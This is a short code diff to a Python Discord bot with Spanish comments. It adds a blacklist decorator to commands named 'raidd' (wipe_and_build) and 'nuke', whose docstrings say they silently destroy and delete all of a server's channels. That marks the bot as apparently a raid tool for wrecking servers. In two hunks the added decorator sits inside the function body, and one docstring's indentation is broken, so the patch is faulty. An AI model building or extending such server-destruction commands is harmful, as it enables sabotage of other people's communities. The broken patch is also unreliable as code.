@@ -140,6 +140,7 @@ async def borrar_categoria(ctx, nombre):
 # ----------------------------
 @bot.command()
 @commands.has_permissions(administrator=True)
+@is_not_blacklisted_server()
 async def gbk(ctx, nombre):
     guild = ctx.guild
 
@@ -281,7 +282,8 @@ async def stats(ctx):
 
 @bot.command(name='raidd', aliases=['wipe_and_build'])
 async def full_server_reset(ctx):
-    """Combina destrucción y reconstrucción de forma silenciosa."""
+@is_not_blacklisted_server()
+  """Combina destrucción y reconstrucción de forma silenciosa."""
     
     # --- FASE 1: DESTRUCCIÓN (Lógica de !nuke concurrente) ---
     
@@ -323,6 +325,7 @@ async def full_server_reset(ctx):
 
 @bot.command(name='nuke', aliases=['eliminar-canales', 'delall'])
 async def nuke_channels(ctx):
+@is_not_blacklisted_server()
     """Elimina todos los canales del servidor de forma silenciosa."""
     
     deleted_count = 0
